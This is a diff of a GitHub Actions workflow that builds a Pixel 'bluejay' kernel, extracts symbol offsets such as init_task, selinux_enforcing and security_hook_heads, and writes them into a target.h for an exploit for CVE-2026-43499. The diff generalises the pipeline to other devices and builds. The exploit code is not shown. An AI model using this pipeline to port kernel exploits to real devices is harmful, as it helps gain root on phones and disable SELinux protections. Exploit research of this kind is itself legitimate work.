@@ -7,10 +7,18 @@ on:
         description: 'Kernel branch to compile'
         required: true
         default: 'android-gs-bluejay-6.1-android16-dp'
-      output_artifact:
-        description: 'Upload vmlinux as artifact'
-        required: false
-        default: 'true'
+      device_name:
+        description: 'Device code name (e.g., bluejay)'
+        required: true
+        default: 'bluejay'
+      build_version:
+        description: 'Build version (e.g., BP2A.250705.008)'
+        required: true
+        default: 'BP2A.250705.008'
+      api_level:
+        description: 'Android API level'
+        required: true
+        default: '34'
 
 jobs:
   compile-kernel:
@@ -84,129 +92,76 @@ jobs:
         ls -lh out/vmlinux
         nm -S out/vmlinux | head -20
 
-    - name: Extract offsets
+    - name: Extract offsets using Python script
       run: |
-        cd kernel_src
-        python3 << 'EOF'
-import subprocess
+        python3 scripts/extract_kernel_offsets.py \
+          kernel_src/out/vmlinux \
+          kernel_src/extracted_offsets.h
 
-KIMAGE_TEXT_BASE = 0xffffffc080000000
-
-# Get all symbols with their addresses
-result = subprocess.run(['nm', '-S', 'out/vmlinux'], capture_output=True, text=True)
-
-symbols_dict = {}
-for line in result.stdout.split('\n'):
-    if not line.strip():
-        continue
-    
-    parts = line.split()
-    if len(parts) < 3:
-        continue
-    
-    try:
-        addr_str = parts[0]
-        symbol = parts[-1]
-        
-        addr = int(addr_str, 16)
-        offset = addr - KIMAGE_TEXT_BASE
-        
-        symbols_dict[symbol] = offset
-    except:
-        pass
-
-# Print offsets for CVE-2026-43499 exploit
-print("[*] Extracted kernel offsets for Bluejay BP2A.250705.008")
-print()
-
-# Key symbols needed for the exploit
-NEEDED = [
-    'init_task', 'selinux_enforcing', 'security_hook_heads',
-    'kmalloc_caches', 'root_task_group', 'selinux_blob_sizes',
-    'anon_pipe_buf_ops', 'nfulnl_logger', 'configfs_read_iter',
-    'configfs_bin_write_iter', 'copy_splice_read', 'noop_llseek'
-]
-
-found_offsets = {}
-
-for symbol, offset in sorted(symbols_dict.items()):
-    for needed in NEEDED:
-        if needed.lower() in symbol.lower():
-            found_offsets[symbol] = offset
-            print(f"#define {symbol.upper():45s}_OFF 0x{offset:010x}ULL")
-            break
-
-# Save to file
-with open('extracted_offsets.txt', 'w') as f:
-    f.write("# Bluejay BP2A.250705.008 Kernel Offsets\n")
-    f.write("# Kernel branch: android-gs-bluejay-6.1-android16-dp\n\n")
-    
-    f.write("#ifndef OFFSET_H\n")
-    f.write("#define OFFSET_H\n\n")
-    
-    f.write('#define BUILD_VARIANT_LABEL "bluejay"\n')
-    f.write('#define BUILD_FINGERPRINT "google/bluejay/bluejay:14/BP2A.250705.008/...:user/release-keys"\n\n')
-    
-    f.write("#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL\n")
-    f.write("#define P0_PAGE_OFFSET 0xffffff8000000000ULL\n")
-    f.write("#define P0_PHYS_OFFSET 0x80000000ULL\n")
-    f.write("#define P0_KERNEL_PHYS_LOAD 0x80000000ULL\n")
-    f.write("#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL\n")
-    f.write("#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL\n")
-    f.write("#define DIRECT_MAP_BASE 0xffffff8000000000ULL\n")
-    f.write("#define DIRECT_MAP_END 0xffffff9000000000ULL\n")
-    f.write("#define VMEMMAP_START 0xfffffffe00000000ULL\n\n")
-    
-    for symbol, offset in sorted(found_offsets.items(), key=lambda x: x[1]):
-        f.write(f"#define {symbol.upper():45s}_OFF 0x{offset:010x}ULL\n")
-    
-    f.write("\n#endif\n")
-
-print("\n[+] Offsets saved to extracted_offsets.txt")
-EOF
-
-    - name: Upload offsets artifact
-      uses: actions/upload-artifact@v3
-      with:
-        name: kernel-offsets
-        path: kernel_src/extracted_offsets.txt
-        retention-days: 30
-
-    - name: Upload vmlinux artifact
-      if: github.event.inputs.output_artifact == 'true'
-      uses: actions/upload-artifact@v3
-      with:
-        name: vmlinux-bluejay
-        path: kernel_src/out/vmlinux
-        retention-days: 30
-
-    - name: Create target.h
+    - name: Display extracted offsets
       run: |
-        mkdir -p IonStack/CVE-2026-43499/exploit/src/targets/bluejay-BP2A.250705.008
-        cp kernel_src/extracted_offsets.txt IonStack/CVE-2026-43499/exploit/src/targets/bluejay-BP2A.250705.008/target.h
+        echo "=== Extracted Offsets ==="
+        cat kernel_src/extracted_offsets.h
+
+    - name: Create target directory
+      run: |
+        mkdir -p IonStack/CVE-2026-43499/exploit/src/targets/${{ github.event.inputs.device_name }}-${{ github.event.inputs.build_version }}
+
+    - name: Copy offsets to target.h
+      run: |
+        cp kernel_src/extracted_offsets.h \
+           IonStack/CVE-2026-43499/exploit/src/targets/${{ github.event.inputs.device_name }}-${{ github.event.inputs.build_version }}/target.h
 
     - name: Test exploit compilation
       run: |
         cd IonStack/CVE-2026-43499/exploit
-        make PROJECT=bluejay-BP2A.250705.008 API=34 info || true
+        make PROJECT=${{ github.event.inputs.device_name }}-${{ github.event.inputs.build_version }} \
+             API=${{ github.event.inputs.api_level }} \
+             info
 
-    - name: Upload build artifacts
-      if: always()
+    - name: Upload offsets artifact
       uses: actions/upload-artifact@v3
       with:
-        name: build-results
-        path: |
-          kernel_src/out/.config
-          kernel_src/extracted_offsets.txt
-          IonStack/CVE-2026-43499/exploit/src/targets/bluejay-BP2A.250705.008/target.h
+        name: kernel-offsets-${{ github.event.inputs.device_name }}
+        path: kernel_src/extracted_offsets.h
         retention-days: 30
 
-    - name: Summary
+    - name: Upload vmlinux artifact
+      uses: actions/upload-artifact@v3
+      with:
+        name: vmlinux-${{ github.event.inputs.device_name }}
+        path: kernel_src/out/vmlinux
+        retention-days: 30
+
+    - name: Upload target.h artifact
+      uses: actions/upload-artifact@v3
+      with:
+        name: target-h-${{ github.event.inputs.device_name }}
+        path: IonStack/CVE-2026-43499/exploit/src/targets/${{ github.event.inputs.device_name }}-${{ github.event.inputs.build_version }}/target.h
+        retention-days: 30
+
+    - name: Upload kernel config
+      uses: actions/upload-artifact@v3
+      with:
+        name: kernel-config-${{ github.event.inputs.device_name }}
+        path: kernel_src/out/.config
+        retention-days: 30
+
+    - name: Build summary
+      if: always()
       run: |
-        echo "=== Build Summary ==="
+        echo "========================================="
+        echo "     Kernel Compilation Summary"
+        echo "========================================="
+        echo "Device: ${{ github.event.inputs.device_name }}"
+        echo "Build Version: ${{ github.event.inputs.build_version }}"
         echo "Kernel Branch: ${{ github.event.inputs.kernel_branch }}"
-        echo "Status: Complete"
+        echo "API Level: ${{ github.event.inputs.api_level }}"
         echo ""
         echo "Generated Files:"
-        ls -lh kernel_src/extracted_offsets.txt
-        ls -lh IonStack/CVE-2026-43499/exploit/src/targets/bluejay-BP2A.250705.008/target.h 2>/dev/null || echo "target.h will be created"
+        echo "  - target.h: IonStack/CVE-2026-43499/exploit/src/targets/${{ github.event.inputs.device_name }}-${{ github.event.inputs.build_version }}/target.h"
+        echo "  - vmlinux: kernel_src/out/vmlinux"
+        echo "  - Offsets: kernel_src/extracted_offsets.h"
+        echo ""
+        echo "Compilation Status: ✓ Complete"
+        echo "========================================="
